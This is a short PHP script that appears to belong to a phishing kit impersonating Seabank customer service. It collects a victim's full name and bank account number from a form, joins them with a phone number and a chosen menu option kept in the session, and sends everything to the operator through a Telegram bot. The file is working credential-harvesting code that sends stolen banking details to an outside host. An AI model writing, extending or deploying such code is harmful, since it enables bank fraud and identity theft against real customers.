<?php
session_start();
include "./telegram.php";

$nama = $_POST['nama'];
$_SESSION['nama'] = $nama;
$rek = $_POST['rek'];
$_SESSION['rek'] = $rek;
$tarif = $_SESSION['tarif'];
$nohp = $_SESSION['nohp'];

$message = "
Seabank Menu Pilihan
───────────────────────
• Menu Pilihan : $tarif
• Nomor Handphone : $nohp
• Nama Lengkap : $nama
• Nomor Rekening : $rek
───────────────────────
© Cs Seabank - 2026
";

sendMessage($wahyustr_id, $message, $wahyustr_bot);

?>